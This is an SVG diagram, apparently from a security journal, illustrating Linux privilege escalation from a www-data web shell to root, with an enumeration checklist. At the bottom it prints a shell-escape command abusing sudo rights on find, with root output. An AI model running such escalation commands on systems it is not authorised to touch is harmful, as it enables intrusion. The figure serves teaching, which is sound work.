<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 675" width="1200" height="675" role="img" aria-label="Privilege ladder from www-data to root">
  <rect width="1200" height="675" fill="#08080a"/>
  <g stroke="#1b1b20"><path d="M0 92h1200M0 592h1200M100 0v675"/></g>

  <text x="56" y="56" font-family="ui-monospace, monospace" font-size="13" letter-spacing="3.4" fill="#5a5a63">GLORISON CYBER JOURNAL</text>
  <text x="1144" y="56" text-anchor="end" font-family="ui-monospace, monospace" font-size="13" letter-spacing="2.4" fill="#8a4a4c">LINUX</text>

  <g stroke="#2b2b32" fill="#0b0b0e">
    <rect x="120" y="452" width="200" height="112"/>
    <rect x="320" y="376" width="200" height="188"/>
    <rect x="520" y="300" width="200" height="264"/>
    <rect x="720" y="224" width="200" height="340"/>
  </g>

  <g font-family="ui-monospace, monospace" font-size="11">
    <text x="140" y="480" fill="#6a6a73">UID 33</text>
    <text x="140" y="506" fill="#8b8b93" font-size="13">www-data</text>
    <text x="140" y="530" fill="#4e4e57">web shell</text>

    <text x="340" y="404" fill="#6a6a73">UID 1000</text>
    <text x="340" y="430" fill="#8b8b93" font-size="13">glorison</text>
    <text x="340" y="454" fill="#4e4e57">reused credential</text>

    <text x="540" y="328" fill="#6a6a73">SUID / CAP</text>
    <text x="540" y="354" fill="#8b8b93" font-size="13">elevated</text>
    <text x="540" y="378" fill="#4e4e57">misconfigured binary</text>

    <text x="740" y="252" fill="#ef4444">UID 0</text>
    <text x="740" y="278" fill="#ff6568" font-size="13">root</text>
    <text x="740" y="302" fill="#8a4a4c">full control</text>
  </g>

  <g stroke="#ef4444" stroke-opacity="0.55" fill="none">
    <path d="M220 452v-24h100"/>
    <path d="M420 376v-24h100"/>
    <path d="M620 300v-24h100"/>
  </g>
  <g fill="#ef4444"><circle cx="320" cy="428" r="3"/><circle cx="520" cy="352" r="3"/><circle cx="720" cy="276" r="3"/></g>

  <g font-family="ui-monospace, monospace" font-size="11.5">
    <text x="960" y="160" font-size="10.5" letter-spacing="2.4" fill="#6a6a73">ENUMERATION ORDER</text>
    <path d="M960 176h184" stroke="#232329"/>
    <text x="960" y="206" fill="#8b8b93">01  id · groups</text>
    <text x="960" y="234" fill="#8b8b93">02  sudo -l</text>
    <text x="960" y="262" fill="#8b8b93">03  find -perm -4000</text>
    <text x="960" y="290" fill="#8b8b93">04  getcap -r /</text>
    <text x="960" y="318" fill="#8b8b93">05  crontab</text>
    <text x="960" y="346" fill="#8b8b93">06  services</text>
    <text x="960" y="374" fill="#8b8b93">07  secrets</text>
    <text x="960" y="402" fill="#5f5f68">08  kernel — last resort</text>
  </g>

  <g font-family="ui-monospace, monospace" font-size="11" fill="#5f5f68">
    <text x="120" y="616">$ sudo find . -exec /bin/sh -p \; -quit</text>
    <text x="120" y="638" fill="#a9c7a0">uid=0(root) gid=0(root)</text>
  </g>

  <text x="1144" y="640" text-anchor="end" font-family="ui-monospace, monospace" font-size="12" letter-spacing="2.2" fill="#4a4a52">FIG. 06 — METHOD, NOT MAGIC</text>
</svg>
